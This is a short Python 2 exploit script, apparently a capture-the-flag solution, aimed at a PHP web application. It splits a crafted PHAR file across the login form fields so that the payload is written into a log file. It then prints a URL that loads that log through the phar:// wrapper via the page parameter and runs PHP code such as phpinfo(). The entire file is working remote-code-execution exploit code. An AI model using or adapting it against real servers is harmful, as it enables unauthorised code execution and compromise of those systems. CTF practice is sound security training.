#!/usr/bin/env python

import requests
import urllib
import sys

s = " => "
host = sys.argv[1]
port = int(sys.argv[2])

url = "http://%s:%d/login.php?debug=hitctf" % (host, port)

with open("c.phar") as f:
    content = f.read()

username = content[:15]
password = content[15 + len(s):]

print "[+] User : [%s]" % (urllib.quote(username))

data = {
    "username":username,
    "password":password
}

response = requests.post(url, data=data)
print response.content

print "[+] http://%s:%d/?page=phar://log/%s.log/c&c=phpinfo();" % (host, port, urllib.quote(username))
